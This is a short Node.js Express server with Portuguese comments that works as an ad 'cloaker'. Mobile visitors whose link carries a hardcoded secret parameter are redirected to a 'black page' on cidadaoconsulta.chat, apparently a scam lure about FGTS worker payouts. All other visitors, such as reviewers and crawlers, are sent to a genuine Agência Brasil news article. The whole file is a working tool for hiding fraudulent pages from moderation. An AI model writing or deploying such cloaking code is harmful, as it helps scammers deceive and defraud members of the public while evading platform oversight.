const express = require("express");
const MobileDetect = require("mobile-detect");
const app = express();
const port = process.env.PORT || 3000;

// Configurações das páginas
const whitePage =
  process.env.WHITE_PAGE ||
  "https://agenciabrasil.ebc.com.br/radioagencia-nacional/economia/audio/2024-08/trabalhadores-vao-receber-parte-do-lucro-de-r-152-bilhoes-do-fgts";
const blackPage =
  process.env.BLACK_PAGE || "https://www.cidadaoconsulta.chat/etapa1/";

// Parâmetros de segurança
const securityParamName = process.env.SECURITY_PARAM_NAME || "JS1CLdcHVbKA";
const securityParamValue = process.env.SECURITY_PARAM_VALUE || "LBowyKAwmgeO";

// Middleware principal
app.get("*", async (req, res) => {
  try {
    // Log do User-Agent
    console.log("User-Agent:", req.headers["user-agent"]);

    // Detectar dispositivo móvel
    const md = new MobileDetect(req.headers["user-agent"]);
    const isMobile = md.mobile() !== null;
    console.log("É dispositivo móvel:", isMobile);

    // Verificar parâmetros de segurança
    const paramValid = req.query[securityParamName] === securityParamValue;
    console.log("Parâmetros válidos:", paramValid);
    console.log("Query params:", req.query);

    // Verificar condições
    const shouldShowBlackPage = isMobile && paramValid;
    console.log("Mostrar página black:", shouldShowBlackPage);

    // Redirecionar para a página apropriada
    const targetUrl = shouldShowBlackPage ? blackPage : whitePage;
    const fullUrl = `${targetUrl}?${new URLSearchParams(req.query).toString()}`;
    console.log("Redirecionando para:", targetUrl);

    res.redirect(fullUrl);
  } catch (error) {
    console.error("Erro detalhado:", error);
    res.redirect(whitePage);
  }
});

app.listen(port, () => {
  console.log(`Servidor rodando na porta ${port}`);
});
